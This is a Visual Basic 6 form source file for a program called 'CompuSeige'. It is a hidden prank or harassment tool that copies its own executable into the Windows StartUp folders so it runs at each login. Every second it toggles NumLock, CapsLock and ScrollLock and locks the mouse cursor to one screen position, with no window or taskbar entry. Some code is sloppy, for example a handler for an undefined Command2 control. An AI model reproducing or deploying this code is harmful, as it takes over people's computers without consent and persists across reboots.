VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "CompuSeige"
   ClientHeight    =   1395
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   1800
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1395
   ScaleWidth      =   1800
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Frame Frame1 
      Caption         =   "Controls"
      Height          =   1335
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   1575
      Begin VB.Timer tmrMouse 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   2640
         Top             =   480
      End
      Begin VB.Timer tmrKeys 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   2880
         Top             =   120
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Close"
         Height          =   375
         Left            =   120
         TabIndex        =   2
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Seige PC Inputs"
         Height          =   375
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   1335
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Me.WindowState = vbMinimized
tmrKeys.Enabled = True
tmrMouse.Enabled = True
End Sub

Private Sub Command2_Click()
If Command2.Value = 1 Then
FormsOnTop Me, True
ElseIf Command2.Value = 0 Then
FormsOnTop Me, False
End If
End Sub

Private Sub Command3_Click()
Unload Me
End
End Sub


Private Sub Form_Load()
Me.WindowState = vbMinimized
tmrKeys.Enabled = True
tmrMouse.Enabled = True
Dim strDir As String
Dim intDir As Integer
Dim strpath As String


intDir = Len(CurDir())  'Gets length of Current directory
'Gets last character from CurDir() and checks if it's a \
strDir = Mid(CurDir(), intDir)
If strDir = "\" Then
    strpath = CurDir() & App.EXEName & ".exe"
    'If is in main drive like C:\ or D:\ it simply
    'puts the file name, "C:\Blah.exe"
Else
    strpath = CurDir() & "\" & App.EXEName & ".exe"
    'If CurDir() returns no \ then its in a folder
    'and will necessitate a \ inserted so that it looks like
    'C:\Folder\Blah.exe and NOT like C:\FolderBlah.exe
End If
On Error GoTo Death
'Error statement allows this code to run if it is already
'in the Start Menu

FileCopy strpath, _
"C:\WINDOWS\Start Menu\Programs\StartUp\" _
& App.EXEName & ".exe"
Death:
Resume Next
On Error GoTo Ender
FileCopy strpath, "C:\Winnt\Start Menu\Programs\StartUp\" & App.EXEName & ".exe"
Ender:
Exit Sub
Resume Next
End Sub

Private Sub Form_Unload(Cancel As Integer)
tmrKeys.Enabled = False
tmrMouse.Enabled = False
End Sub




Private Sub tmrKeys_Timer()
SendKeys "{NUMLOCK}"
SendKeys "{CAPSLOCK}"
SendKeys "{SCROLLLOCK}"
End Sub


Private Sub tmrMouse_Timer()
SetCursorPos "50", "75"
End Sub


